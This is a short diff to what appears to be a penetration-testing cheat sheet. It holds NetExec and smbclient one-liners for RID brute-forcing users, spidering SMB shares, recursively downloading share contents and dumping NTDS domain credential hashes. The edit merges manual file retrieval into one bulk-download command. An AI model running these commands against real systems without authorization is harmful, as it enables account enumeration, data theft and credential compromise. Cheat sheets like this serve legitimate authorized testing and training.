@@ -558,10 +558,7 @@ nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' --rid-brute 10000 | grep -oP '(?
 
 NXCSPIDER=$(nxc smb "$TARGET" -u '$USERNAME' -p '$PASSWORD' -M spider_plus | grep -oP '(?<=Saved share-file metadata to ")[^"]+');cat $NXCSPIDER | grep -vE 'epoch|size' | sed -E 's/[{}\",:]//g' | sed '/^        $/d'
 mkdir smb; smbclient //$TARGET/SHARE -N -D . -c 'lcd smb; recurse; prompt; mget *'
-
-smbclient \\\\$TARGET\\SHARENAME -U '$USERNAME'%'$PASSWORD'
-impacket-smbclient /'$USERNAME':'$PASSWORD'@$TARGET
-get filename.txt
+mkdir smb; smbclient //$TARGET/SHARE -U '$USERNAME'%'$PASSWORD' -D . -c 'lcd smb; recurse; prompt; mget *'
 
 nxc smb $TARGET -u '$USERNAME' -p '$PASSWORD' --ntds --user Administrator
 nxc smb $TARGET --use-kcache --ntds --user Administrator
